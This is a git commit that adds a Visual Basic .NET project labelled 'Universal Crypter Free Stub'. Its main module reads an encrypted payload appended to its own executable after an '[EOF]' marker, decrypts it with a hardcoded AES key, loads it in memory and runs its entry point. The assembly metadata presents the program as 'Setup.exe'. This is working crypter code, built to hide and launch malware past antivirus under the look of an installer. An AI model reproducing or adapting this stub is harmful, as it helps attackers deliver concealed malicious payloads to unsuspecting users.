1155646aa1669576886072739ec49ae68d3b9f52
UniversDevz <161224853+UniversDevz@users.noreply.github.com>
2024-02-25 15:29:59 +0100

    Add files via upload

---
+++ UniversalFreeStub/UniversalStubFree/Module1.vb
@@ -0,0 +1,44 @@
+﻿Imports System
+Imports System.IO
+Imports System.Reflection
+Imports System.Security.Cryptography
+Imports System.Text
+
+' Universal Crypter Free Stub. All Rights Reserved
+Friend Module Module1
+
+    <STAThread>
+    Sub Main()
+        Dim filePath As String = Path.Combine(Environment.CurrentDirectory, AppDomain.CurrentDomain.FriendlyName.Replace(".vshost", ""))
+
+        If File.Exists(filePath) Then
+            Dim fileContent As String = File.ReadAllText(filePath)
+            Dim password As String = "PzRt12XnQb8765Yt"
+
+            Dim rijAlg As New RijndaelManaged()
+            rijAlg.Key = Encoding.ASCII.GetBytes(password)
+            rijAlg.IV = Encoding.ASCII.GetBytes(password)
+            Dim decryptor As ICryptoTransform = rijAlg.CreateDecryptor(rijAlg.Key, rijAlg.IV)
+
+            Dim msDecrypt As New MemoryStream()
+            Dim csDecrypt As New CryptoStream(msDecrypt, decryptor, CryptoStreamMode.Write)
+
+            If fileContent.Contains("[EOF]") Then
+                Dim base64 As Byte() = Convert.FromBase64String(fileContent.Substring(fileContent.IndexOf("[EOF]") + "[EOF]".Length))
+
+                csDecrypt.Write(base64, 0, base64.Length)
+                csDecrypt.Close()
+
+                Dim asm As Assembly = Assembly.Load(msDecrypt.ToArray())
+
+                Dim entryPoint = asm.EntryPoint
+                If entryPoint IsNot Nothing Then
+                    entryPoint.Invoke(Nothing, New Object() {})
+                End If
+            End If
+        Else
+
+        End If
+    End Sub
+
+End Module
---
+++ UniversalFreeStub/UniversalStubFree/My Project/AssemblyInfo.vb
@@ -0,0 +1,35 @@
+﻿Imports System
+Imports System.Reflection
+Imports System.Runtime.InteropServices
+
+' Les informations générales relatives à un assembly dépendent de
+' l'ensemble d'attributs suivant. Changez les valeurs de ces attributs pour modifier les informations
+' associées à un assembly.
+
+' Vérifiez les valeurs des attributs de l'assembly
+
+<Assembly: AssemblyTitle("Setup.exe")>
+<Assembly: AssemblyDescription("Setup")>
+<Assembly: AssemblyCompany("")>
+<Assembly: AssemblyProduct("Setup")>
+<Assembly: AssemblyCopyright("Copyright ©  2024")>
+<Assembly: AssemblyTrademark("")>
+
+<Assembly: ComVisible(False)>
+
+'Le GUID suivant est pour l'ID de la typelib si ce projet est exposé à COM
+<Assembly: Guid("67887331-942a-4e66-87c7-1d31f6ecaed9")>
+
+' Les informations de version pour un assembly se composent des quatre valeurs suivantes :
+'
+'      Version principale
+'      Version secondaire
+'      Numéro de build
+'      Révision
+'
+' Vous pouvez spécifier toutes les valeurs ou indiquer les numéros de build et de révision par défaut
+' en utilisant '*', comme indiqué ci-dessous :
+' <Assembly: AssemblyVersion("1.0.*")>
+
+<Assembly: AssemblyVersion("1.0.0.0")>
+<Assembly: AssemblyFileVersion("1.0.0.0")>
